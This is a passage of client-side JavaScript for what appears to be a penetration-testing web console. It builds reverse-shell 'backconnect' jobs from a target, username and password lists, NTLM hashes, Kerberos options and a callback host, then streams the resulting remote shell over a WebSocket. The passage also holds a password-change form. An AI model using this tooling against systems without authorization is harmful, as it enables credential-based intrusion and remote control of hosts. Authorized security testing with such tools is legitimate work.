      if (out.textContent.length > 1_000_000) out.textContent = out.textContent.slice(-1_000_000);
      out.scrollTop = out.scrollHeight;
    } else if (msg.type === "closed") {
      out.textContent += "\n[session closed]";
      input.disabled = true;
      closeBtn.disabled = true;
    }
  };
}

document.getElementById("bc-console-input").addEventListener("keydown", (e) => {
  if (e.key === "Enter" && currentBcWs && currentBcWs.readyState === WebSocket.OPEN) {
    currentBcWs.send(e.target.value + "\r\n");
    e.target.value = "";
  }
});

document.getElementById("bc-console-close").addEventListener("click", async () => {
  if (!currentBcSessionId) return;
  await API.del(`/api/backconnect/sessions/${currentBcSessionId}`);
  await refreshListeners();
});

document.getElementById("bc-trigger-btn").addEventListener("click", async () => {
  const resultBox = document.getElementById("bc-trigger-result");
  const triggerButton = document.getElementById("bc-trigger-btn");
  resultBox.textContent = "";
  triggerButton.disabled = true;
  const protocol = document.getElementById("bc-protocol").value;
  const payload = {
    protocol,
    target: document.getElementById("bc-target").value,
    workspace: document.getElementById("bc-workspace").value || "default",
    username: linesToList(document.getElementById("bc-username").value),
    password: linesToList(document.getElementById("bc-password").value),
    hashes: linesToList(document.getElementById("bc-hashes").value),
    domain: document.getElementById("bc-domain").value || null,
    kerberos: document.getElementById("bc-kerberos").checked,
    local_auth: document.getElementById("bc-local-auth").checked,
    command: document.getElementById("bc-command").value,
    shell_type: document.getElementById("bc-shell-type").value,
    confirm_authorized: document.getElementById("bc-confirm-authorized").checked,
    exec_method: document.getElementById("bc-exec-method").value || null,
    extra_args: document.getElementById("bc-extra-args").value,
  };
  try {
    if (!payload.target.trim()) throw new Error("Target is required");
    await refreshBackconnectRoute(false);
    updateGeneratedBackconnectCommand();
    payload.command = document.getElementById("bc-command").value;
    if (!document.getElementById("bc-callback-host").value.trim()) throw new Error("Callback host is required");
    if (!payload.command.trim()) throw new Error("Callback command is required");
    await ensureBackconnectListener();
    const job = await API.post("/api/backconnect/trigger", payload);
    resultBox.textContent = `Triggered - job ${job.id} (${job.status}). Check the Jobs tab / listener sessions above.`;
    await refreshListeners();
  } catch (err) {
    resultBox.textContent = "Error: " + err.message;
  } finally {
    triggerButton.disabled = false;
  }
});

/* ---------------------------- Settings tab ---------------------------- */

document.getElementById("change-password-form").addEventListener("submit", async (e) => {
  e.preventDefault();
  const resultBox = document.getElementById("cp-result");
  const wasRequired = Boolean(currentUser?.must_change_password);
  resultBox.textContent = "";
  try {
    await API.post("/api/auth/change-password", {
      current_password: document.getElementById("cp-current").value,
      new_password: document.getElementById("cp-new").value,
    });
    resultBox.textContent = "Password updated.";
    e.target.reset();
    if (wasRequired) {
      applyCurrentUser({ ...currentUser, must_change_password: false });
      await bootApp();
    }
  } catch (err) {
    resultBox.textContent = "Error: " + err.message;
  }
});

/* ---------------------------- Init ---------------------------- */

tryRestoreSession();
